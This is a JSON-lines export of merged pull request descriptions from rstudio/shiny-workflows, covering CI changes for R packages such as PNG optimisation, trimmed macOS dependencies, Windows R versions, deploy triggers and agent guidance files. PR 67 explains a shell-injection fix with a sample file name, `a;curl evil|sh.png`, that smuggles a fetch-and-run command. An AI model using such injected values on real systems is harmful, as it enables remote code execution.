`actionlint`.\n","published_at":"2026-08-14T16:43:50Z","updated_at":"2026-08-14T16:51:16Z","url":"https://github.com/rstudio/shiny-workflows/pull/68","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T16:51:16Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/67","ref":67,"title":"optimize-pngs: Losslessly optimize PNGs in `routine.yaml`","description":"Supersedes #15 (left open for reference). Same goal — shrink the PNGs checked into packages — reworked against the current `routine.yaml`, which has changed substantially since that branch was cut in 2023.\n\n## What this adds\n\nA new **`optimize-pngs` composite action** (laid out like `format-r-code`: `action.yaml` + a README with an inputs table), called from `routine.yaml` after `document()` / `build_readme()`:\n\n```yaml\n- name: \"`oxipng`; Losslessly optimize PNGs\"\n  if: inputs.optimize-pngs != '' \u0026\u0026 inputs.optimize-pngs != 'false'\n  uses: rstudio/shiny-workflows/optimize-pngs@v1\n  with:\n    paths: ${{ inputs.optimize-pngs }}\n    working-directory: ${{ inputs.working-directory }}\n```\n\n`routine.yaml` gains one input, `optimize-pngs` — newline-separated git pathspecs, defaulting to:\n\n```yaml\noptimize-pngs: |\n  man/figures/*.png\n  vignettes/*.png\n```\n\nMatching **tracked** files are run through `oxipng --opt 4 --strip safe` and committed. Set it to `false` (or an empty string) to disable. `*` crosses `/` in a git pathspec, so nested folders are covered without `**`.\n\nThis carries over the conclusions from #15's review: `oxipng` over `optipng` (@wch), the `optimize-pngs` name (@wch), `vignettes` included (@gadenbuie), and a newline-separated string rather than a YAML list (@schloerke).\n\n## Results on real packages\n\n| | {shinytest2} | {bslib} |\n|---|---|---|\n| Files optimized | 13 | 38 |\n| Size | 1.04 MiB → 737 KiB (**−31%**) | 2.22 MiB → 1.43 MiB (**−36%**) |\n\nVerified **pixel-identical** to the originals via ImageMagick pixel signatures — not just smaller on disk. Idempotent: a second run reports \"could not be optimized further\" and creates no commit.\n\n## Fixes over #15\n\n- **Step ordering** — #15 ran before `build_readme()`, which is what generates `man/figures/README-*.png`, so fresh figures were committed unoptimized and only squashed a run later.\n- **No `tj-actions/glob`** — `git ls-files` does the job with no third-party action in a job holding a write-scoped token for every consumer repo. (`tj-actions` is also the org behind the March 2025 tag-rewriting compromise, CVE-2025-30066.)\n- **No shell injection** — #15 interpolated `${{ steps.figures.outputs.paths }}` into `run:`, so a repo file named `a;curl evil|sh.png` would execute; any path with a space also broke the command. Patterns arrive via `env:`, paths via `-z` / `xargs -0`.\n- **A working install** — `sudo apt-get install oxipng` had no `-y` and no `apt-get update`, and **`oxipng` is not packaged in any Ubuntu release** (only `optipng` is; checked jammy/noble/questing). Now a pinned release binary, which also keeps output stable across runner image updates.\n- **Honors `working-directory`**, which didn't exist in 2023.\n- **Disable with `false`/empty** instead of the string `\"false\"`; `if: inputs.optimize-pngs != \"false\"` in #15 was also a hard workflow parse error, since Actions expressions only accept single-quoted literals.\n\n## Two bugs found by testing against real packages\n\n- **`git add` errors on a pathspec matching nothing** (unlike `git ls-files`). {shinytest2} has no `man/figures/`, so the step optimized 13 files, saved 332 KiB, and then silently committed nothing — the error was swallowed by `|| echo`. It now stages exactly the files it optimized.\n- **The default patterns reached testthat snapshots** nested under `vignettes/`. {shinytest2} compares screenshots with `testthat::compare_file_binary()` when `threshold` is `NULL` (the default) — byte-wise — so optimizing a committed snapshot would keep it from ever matching a fresh screenshot, breaking its own suite. Files under `_snaps/` are now never optimized.\n\nA `:(exclude)*_snaps/*` pathspec is deliberately **not** used for that: `git ls-files` returns *nothing* when an exclude is combined with a single positive pathspec (reproduced on git 2.39.2 and 2.50.1), so anyone narrowing the input to one pattern would silently get a no-op.\n\n## Why `oxipng`, benchmarked\n\n51 real PNGs from {shinytest2} + {bslib} (3.42 MB):\n\n| Tool | Saved | Time | Ubuntu install |\n|---|---|---|---|\n| **`oxipng --opt 4`** | **34.1%** | **6.4s** | pinned binary |\n| `oxipng --opt max` | 34.3% | 33.1s | pinned binary |\n| `optipng -o2` / `-o7` | 27.2% / 27.3% | 24s / 372s | ✅ apt |\n| `advpng -z4` | 31.8% | 699s | ✅ apt |\n| `zopflipng`, `oxipng --zopfli` | — | did not finish in 10 min | — |\n| `ECT -3` | 35.8% | 21s | ❌ no Linux binary |\n\n`optipng` — the only one of these in apt, and the tool #15's README text named — is both worse and 4x slower. ECT is the one tool that beats `oxipng`, and it publishes no Linux binary. `oxipng` is also the most-starred and most actively developed of the set (v10.2.0, released 2026-08-09).\n\n## Verification\n\n- `actionlint` on `routine.yaml`: back to the **baseline 18** shellcheck notes, since nothing is inlined.\n- `shellcheck` on the action script: clean apart from 2 intentional SC2016 backtick notes.\n- Edge cases, all exit 0 with no commit: `false`, `false\\n`, empty string, a pattern matching nothing, a pattern matching only `_snaps/` files, and the single-pattern case above.\n- Platform mapping verified against the published asset list for Linux/macOS on both architectures (`uname -m` says `arm64` on macOS while the asset is `aarch64`); Windows fails with an explicit error, as `oxipng` ships a `.zip` there.\n\n**Not verified:** the `x86_64-unknown-linux-musl` download itself, since there's no Linux runner or Docker available here — tests ran with the macOS release triple, everything else identical. A real routine run closes that out.\n\n## Before merging\n\n1. **The default is on.** Because \"Verify no new commits (push)\" fails the job when a step commits, the first `push` run after `v1` moves will fail in any consumer repo holding an unoptimized PNG, until the images land via a PR. That's how the other auto-commit steps behave, but it is a one-time cost across every repo at once. Say the word and I'll flip the default to disabled so repos opt in.\n2. **`v1` must move after merge** for consumers to see this — and `routine.yaml` references `optimize-pngs@v1`, so the workflow and the new action only line up once the tag moves. Branch-testing from a consumer repo needs that ref temporarily repointed.","published_at":"2026-08-14T16:37:29Z","updated_at":"2026-08-14T20:57:17Z","url":"https://github.com/rstudio/shiny-workflows/pull/67","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T20:57:17Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/66","ref":66,"title":"Reduce macOS brew system requirement installs to XQuartz","description":"Refs #47\n\n## Summary\n\n#47 asked to remove the macOS system requirement installs. Testing showed one of them is load-bearing, so this **reduces** `brew_list` from nine entries to one rather than deleting the step.\n\n`setup-macOS-dependencies` is kept and still called by `setup-r-package`.\n\n## What the test showed\n\nThis PR builds an integration workflow first, then uses it to make the call. Three runs, each on this branch:\n\n| Config | macOS | Windows | macOS job time | Run |\n| --- | --- | --- | --- | --- |\n| full brew list (baseline) | 2/2 ✅ | 6/6 ✅ | 421 s | [31820263328](https://github.com/rstudio/shiny-workflows/actions/runs/31820263328) |\n| brew step removed | **0/2 ❌** | 6/6 ✅ | — | [31821019833](https://github.com/rstudio/shiny-workflows/actions/runs/31821019833) |\n| XQuartz only | 2/2 ✅ | 6/6 ✅ | **129 s** | [31823158655](https://github.com/rstudio/shiny-workflows/actions/runs/31823158655) |\n\nRemoving the step outright breaks `Cairo`. Its macOS binary is linked against XQuartz and the runner image does not ship it, so it installs cleanly and then fails to load:\n\n```\nLibrary not loaded: /opt/X11/lib/libXrender.1.dylib\n```\n\nThat is the awkward version of this failure — installation succeeds, so nothing looks wrong until `dlopen`. `Cairo` is a declared dependency of `rstudio/shiny`, `rstudio/htmltools` and `rstudio/thematic`, so this would have been a real break. Installing XQuartz also restores `capabilities(\"X11\")`.\n\nEverything else in the list can go:\n\n| Package | Reason |\n| --- | --- |\n| `terra`, `textshaping`, `units` | Load from PPM macOS binaries |\n| `RMySQL` | Loads from CRAN's macOS binary; no `mariadb-connector-c` needed |\n| `FreeType` | Not on CRAN at all — no source, no archive, so this entry never matched |\n| `rgdal`, `rgeos` | Archived from CRAN, so these never matched either |\n\n`cairo`, `harfbuzz` and `fribidi` are already on the runner image. Net effect: ~4.5 minutes of `brew install` per macOS job becomes ~20 seconds — most of the old cost was `gdal` and friends.\n\n## Supporting changes\n\n* **`use-public-rspm: always` on macOS.** `setup-r` otherwise enables macOS PPM binaries only for an allowlist of Posit-owned orgs, so the reduced brew list would have depended on which org owns the repo. Scoped to macOS deliberately: applying `always` everywhere would also override `setup-r`'s exclusion of non-Intel Windows, which has no PPM binaries.\n* **New `cache` input on `setup-r-package`** (default `\"always\"`, no behavior change for existing callers). The integration jobs set `cache: \"false\"` — a cache hit would restore packages instead of resolving them, which is the thing being tested.\n* **`CLAUDE.md`**: adding a package to a system-dependency list now requires adding it to the fixture, since the fixture is the only thing keeping the list honest.\n\n## The integration workflow\n\nTwo jobs in `.github/workflows/test-integration.yaml`:\n\n* `macos-deps` — checks a fixture package declaring the affected packages, plus a non-blocking `RMySQL` leg. It **loads** each namespace rather than only installing it, which is the only way the `Cairo` failure is visible, and asserts `capabilities(\"cairo\")` to cover the `grDevices` entry (a base package, so never installed).\n* `windows-httpuv` — `rstudio/httpuv` across devel, release and `oldrel-1`..`oldrel-4`, confirming older toolchains still resolve. It has `src/` and needs compilation, so each leg exercises a real Rtools.\n\nBoth bypass the reusable `R-CMD-check.yaml`, and both rewrite `rstudio/shiny-workflows/\u003cname\u003e@v1` refs to the SHA under test. GitHub Actions does not allow expressions in `uses:`, so without that rewrite the jobs would silently exercise the released `v1` of every sibling action — the reduced `brew_list` would not have been tested at all.\n\n## Note for review\n\nThe branch keeps the remove-then-reduce history rather than squashing it, so the failing middle commit is the evidence for the final shape. Squash on merge.","published_at":"2026-08-14T16:27:52Z","updated_at":"2026-08-14T21:07:40Z","url":"https://github.com/rstudio/shiny-workflows/pull/66","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T21:07:40Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/65","ref":65,"title":"docs: Add update-v1-tag skill and point release docs at it","description":"## Summary\n\nAdds `.claude/skills/update-v1-tag/SKILL.md`, a project skill (checked in, so the whole team gets it) covering the one operation in this repo that reaches every consumer at once: force-moving the `v1` tag. `README.md` and `CLAUDE.md` now point at the skill instead of restating the commands.\n\nThe skill's centerpiece is a **mandatory confirmation gate** — pre-flight checks run, then the agent stops, shows the user the exact `git log v1..origin/main` commit list plus the rollback sha, and waits for explicit approval before force-pushing. This exists because moving `v1` ships *every* unreleased commit on `main`, not just the one you merged, so the person releasing is usually also shipping other people's work. The gate is backed by a rationalization table (approval-to-merge is not approval-to-deploy, \"it's docs-only\", \"I'll roll back if it breaks\") since this is a discipline failure, not a knowledge gap.\n\nBeyond the gate it encodes hazards that surfaced during testing: tag `origin/main` explicitly rather than `HEAD` (which may be a pre-squash branch commit) or local `main` (often stale, or owned by another worktree); prefer scoped `git push origin v1 --force` over `--tags -f`, which can collaterally move unrelated tags; keep `v1` lightweight, since annotating changes what `actions/checkout` resolves; and grep for cross-references left pointing at a test branch.\n\n**Doc fix:** both `README.md` and `CLAUDE.md` documented bare `git tag -f v1`, which tags `HEAD` — wrong whenever you are not sitting exactly on the merge commit, and this repo's normal flow (squash merge, then release from a feature-branch worktree) puts you somewhere else. Rather than correcting the commands in two more places, both now defer to the skill as the single source of truth; duplicating them is what let the bug persist. `CLAUDE.md` additionally instructs that the skill be used after a PR is merged to `main`.\n\nDocs only — no workflow or action behavior changes.\n\n## Verification\n\nDeveloped against a baseline: an agent given \"a PR merged, make it available to consumers\" *without* the skill produced correct mechanics (`CLAUDE.md` already documented the commands) but went straight from checks to force-pushing, with no point at which it asked the user. Re-running the identical prompt with the skill present, the agent stopped at the gate, refused to continue, and specifically called out that two of the three shipping commits weren't the requester's — it also independently flagged the bare-`git tag -f v1` bug in the docs.\n\nTo reproduce: `claude` in this repo, then ask it to make a merged change available to consumer repos. It should surface the commit list and stop rather than push.","published_at":"2026-08-14T15:36:47Z","updated_at":"2026-08-14T15:44:50Z","url":"https://github.com/rstudio/shiny-workflows/pull/65","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T15:44:50Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/64","ref":64,"title":"website: Support manually triggered site rebuilds","description":"Fixes #25\n\n## Problem\n\nThe pkgdown build was spun out of `routine.yaml` into `website.yaml` a while back, but the actual goal of #25 — *\"you can't manually trigger a website rebuild\"* — was never reachable, for two reasons:\n\n1. The deploy step in `website.yaml` was gated on `github.event_name == 'push'`. A manually triggered run would take the *\"Verify index reference\"* path instead: it would build the site, verify it, and then throw it away without deploying.\n2. The `Package checks` template in the README has no `workflow_dispatch:` trigger, so there was nothing to trigger by hand in the first place.\n\n## Change\n\n- **`.github/workflows/website.yaml`**: deploy on `workflow_dispatch` and `repository_dispatch` in addition to `push`. `pull_request` and `schedule` are unchanged — they still only build and verify.\n\n  The condition is computed once in a pre-step rather than spelled out (and negated) at each use site:\n\n  ```yaml\n  - name: Should the site be deployed?\n    id: deploy\n    shell: bash\n    run: |\n      echo \"value=${{ github.event_name == 'push' || github.event_name == 'workflow_dispatch' || github.event_name == 'repository_dispatch' }}\" \u003e\u003e \"$GITHUB_OUTPUT\"\n  ```\n\n  ...then `if: steps.deploy.outputs.value == 'true'` on the deploy step and `!= 'true'` on the verify step. The two steps are renamed accordingly, since neither is push-specific any more.\n\n- **`examples/website.yaml`** (new): a caller workflow consumers can copy to run the site as its own workflow. It builds on the same `push` / `pull_request` triggers as `Package checks` so the site is still built often, and adds `workflow_dispatch` / `repository_dispatch` so it can be rebuilt on demand without re-running the full `R-CMD-check` matrix.\n\n  Its concurrency group is `website-${{ github.event.pull_request.number || github.ref }}` with `cancel-in-progress` only on pull requests: superseded PR builds are cancelled rather than queued, while pushes queue so two deploys never race on `gh-pages`.\n\n  Adopting this file means dropping the `website` job from `Package checks` — otherwise the site is built twice per push. This is called out in the file header and in both READMEs.\n- **`README.md`**: add `workflow_dispatch:` to the `Package checks` template, document the deploy-triggering events, and point at the new example.\n- **`examples/README.md`**: usage section for the new example, following the `lock-threads` pattern.\n\n## Event behavior\n\n| event | before | after |\n| --- | --- | --- |\n| `push` | build + deploy | build + deploy |\n| `pull_request` | build + verify | build + verify |\n| `schedule` | build + verify | build + verify |\n| `workflow_dispatch` | build + verify (no deploy) | build + **deploy** |\n| `repository_dispatch` | build + verify (no deploy) | build + **deploy** |\n\nIf the pre-step's output is ever empty, `!= 'true'` means the job falls back to verify-only — it will not deploy by accident.\n\n## Testing notes\n\nBoth YAML files and the README's embedded template parse cleanly, and the pre-step is ordered ahead of both consumers of its output. This repo has no test suite, so the meaningful check is a consuming repo copying `examples/website.yaml` (pointed at `@schloerke/issue-25-website-dispatch`) and confirming that *Run workflow* actually deploys to `gh-pages`.\n\n","published_at":"2026-08-14T15:35:42Z","updated_at":"2026-08-14T16:15:39Z","url":"https://github.com/rstudio/shiny-workflows/pull/64","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T16:15:39Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/63","ref":63,"title":"R-CMD-check: Derive Windows R versions from oldrel instead of hardcoding","description":"Fixes #46\n\n## Problem\n\nThe Windows section of the `R-CMD-check` matrix hardcoded R `4.4`, `4.3`, `4.2`, and `4.1`, each with an explicit `rtools-version`. That list only changes when someone edits it by hand, which cuts both ways:\n\n- outdated R versions linger on the matrix (the original complaint in #46 — R 3.6 was only dropped by a manual edit in #45),\n- and each new R release silently *loses* coverage until someone adds the new version.\n\nAs of today R release is 4.6.1, so the hardcoded list was already stale: it topped out at 4.4 and still tested R 4.1, which has aged out of the [tidyverse R version support policy](https://www.tidyverse.org/blog/2019/04/r-version-support/) window.\n\n## Change\n\nResolve the Windows R versions from the `oldrel-*` `setup-r` outputs that the `setup` job already computes, exactly like the Ubuntu matrix does. This tracks the tidyverse policy — release plus the four previous versions — with no maintenance.\n\n```python\nfor oldrel in [\"oldrel1\", \"oldrel2\", \"oldrel3\", \"oldrel4\"]:\n    if has_src and is_valid_os(windows, rver[oldrel]):\n        config.append(job(windows, rver[oldrel]))\n```\n\nTwo things dropped along the way:\n\n- **The explicit `rtools-version`.** `r-lib/actions/setup-r` resolves a suitable Rtools from the R version when the input is empty — `setup-r/src/installer.ts:499-509` falls back to `version.rtools` / `version.rtools_url`, which come from the r-hub `rversions/resolve` API. Confirmed against that API for every version this matrix requests:\n\n  | requested | R | rtools |\n  | --- | --- | --- |\n  | `release` | 4.6.1 | 45 |\n  | `oldrel/1` | 4.5.3 | 45 |\n  | `oldrel/2` | 4.4.3 | 44 |\n  | `oldrel/3` | 4.3.3 | 43 |\n  | `oldrel/4` | 4.2.3 | 42 |\n  | `4.1.3` | 4.1.3 | 40 (CRAN `rtools40-x86_64.exe`) |\n\n  Note the old R 4.1 → Rtools40 special case is handled correctly by the API, so nothing is lost if `oldrel-4` ever reaches back that far again.\n\n- **The `rtools-40` input.** It gated the oldest Windows version, which is now always tested. A GitHub code search across the 52 repos that consume this workflow (shiny, bslib, httpuv, htmltools, promises, chromote, shinytest2, r-lib/{R6,cachem,fastmap,later}, …) found **no** repo that sets it — it was dead configuration, and every consumer was running on the `true` default. Its README parameter bullet is removed along with it. Removing it is therefore a no-op in practice, though it is technically a breaking input change for any private consumer that sets it.\n\n## Behavior\n\nSimulating the config script with the current `setup-r` outputs:\n\n| scenario | Windows jobs generated |\n| --- | --- |\n| default (release 4.6.1) | devel, 4.6.1, 4.5.3, 4.4.3, 4.3.3, 4.2.3 |\n| `minimum-r-version: 4.4` | devel, 4.6.1, 4.5.3, 4.4.3 |\n| `windows: false` | none |\n| package without `src/` | 4.6.1 only |\n\nR 3.6 / 4.0 can no longer appear on the matrix at all, and the list advances on its own with each R release.\n\n## Testing notes\n\nVerified by extracting the inline Python config script and running it against mocked `setup-r` outputs (the cases above), plus live queries to the r-hub resolve API for the Rtools table. This repo has no test suite, so the real validation is a consuming repo pointing at `@schloerke/issue-46-windows-oldrel` and confirming the generated matrix and that Rtools installs on the older Windows jobs.\n\n","published_at":"2026-08-14T15:33:59Z","updated_at":"2026-08-14T16:15:42Z","url":"https://github.com/rstudio/shiny-workflows/pull/63","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T16:15:42Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/62","ref":62,"title":"docs: Add CLAUDE.md with repo guidance for Claude Code","description":"## Summary\n\nAdds a `CLAUDE.md` at the repo root so Claude Code (and anyone new to this repo) starts with accurate context instead of inferring it from the YAML.\n\nIt documents the three layers of the repo and how they relate: the reusable workflows in `.github/workflows/` consumed via `workflow_call`, the top-level composite actions consumed as `rstudio/shiny-workflows/\u003cdir\u003e@v1`, and the internal-only composite actions in `.github/internal/`. It also records two things that are not discoverable from the code: that there is no build system, test suite, or linter here (changes are validated by consuming repos actually running the workflows), and that shipping a change requires force-moving the `v1` tag after merge — until that happens, consumers on `@v1` see nothing. The conventions section captures the `@v1` cross-reference gotcha (in-branch changes to an action aren't picked up by a workflow in the same branch), the requirement to keep `README.md` and each action's README in sync with `action.yaml` inputs, and the feature-adoption policy from the README.\n\nDocs only — no workflow or action behavior changes.\n\n## Verification\n\n`git diff origin/main...HEAD --stat` shows a single added file. Nothing under `.github/` or any action directory is touched, so no consumer repo behavior can change. To verify the content, run `claude` in a clone of this repo and confirm the guidance above is loaded as project instructions.","published_at":"2026-08-14T15:30:33Z","updated_at":"2026-08-14T15:31:19Z","url":"https://github.com/rstudio/shiny-workflows/pull/62","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T15:31:19Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/61","ref":61,"title":"feat: Expose an `error-on` input on `R-CMD-check.yaml`","description":"Closes #60\n\n## Summary\n\n`R-CMD-check.yaml` called `r-lib/actions/check-r-package` without setting `error-on`, so the action's own default of `'\"warning\"'` applied and a NOTE always passed CI, with no input to change that. `extra-check-args` doesn't help — those are `R CMD check` arguments, not `rcmdcheck`'s `error_on`.\n\nThis adds an `error-on` string input to the reusable workflow and forwards it to the action. The default is `'\"warning\"'`, identical to the action's default, so every existing caller is byte-for-byte unchanged; only repos that opt in see different behavior. The value follows the same YAML-quoting convention as `check-dir` / `extra-check-args` — it is interpolated into R code, so it must be a quoted R string.\n\n`'\"note\"'` can be flaky in CI even for a locally clean package, because of environment NOTEs like *checking CRAN incoming feasibility* and *checking for future file timestamps*. That is documented on the input and in the README, and is why this is opt-in per repo rather than the default.\n\n## Verification\n\nA caller that wants NOTEs to fail:\n\n```yaml\njobs:\n  R-CMD-check:\n    uses: rstudio/shiny-workflows/.github/workflows/R-CMD-check.yaml@v1\n    with:\n      error-on: '\"note\"'\n```\n\nCallers that omit `error-on` produce the same `rcmdcheck()` call as before.","published_at":"2026-08-14T15:29:50Z","updated_at":"2026-08-14T15:30:25Z","url":"https://github.com/rstudio/shiny-workflows/pull/61","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T15:30:25Z","state":"MERGED"}}
